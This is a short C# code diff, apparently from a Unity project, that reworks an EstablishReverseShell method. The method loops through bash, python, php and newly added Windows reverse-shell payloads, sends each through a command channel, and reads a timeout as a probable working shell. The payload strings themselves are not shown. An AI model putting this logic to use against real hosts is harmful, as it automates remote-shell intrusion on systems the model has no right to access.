@@ -7,6 +7,7 @@ using System.Threading.Tasks;
 using Service;
 using Service.Exploit;
 using UnityEditorInternal;
+using UnityEngine;
 
 namespace Machine
 {
@@ -140,7 +141,7 @@ namespace Machine
             }
         }
 
-        public async void EstablishReverseShell()
+        public async Task<bool> EstablishReverseShell()
         {
             List<string> payloads = new List<string>();
 
@@ -149,6 +150,10 @@ namespace Machine
                 case ShellType.Linux:
                     await AddPayloads(payloads, "bash");
                     await AddPayloads(payloads, "python");
+                    break;
+                case ShellType.Windows:
+                    await AddPayloads(payloads, "python");
+                    await AddPayloads(payloads, "windows");
                     break;
                 case ShellType.Php:
                     await AddPayloads(payloads, "php");
@@ -159,18 +164,25 @@ namespace Machine
             
             foreach (string payload in payloads)
             {
-                int timeout = 1000;
+                const int timeout = 10000;
+                Debug.Log(payload);
                 Task<string> task = SendCommand(payload);
+                Debug.Log(await task);
                 if (await Task.WhenAny(task, Task.Delay(timeout)) == task)
                 {
                     // Web request did not stop execution, payload was not successful.
+                    Debug.Log(task.Result);
                     continue;
                 }
+
+                Debug.Log(await task);
                 
                 // Web request timed out, high probability that it stopped execution
                 // Either reverse shell worked, either server is down (or bad internet connection)
-                return;
+                return true;
             }
+
+            return false;
         }
     }
 }
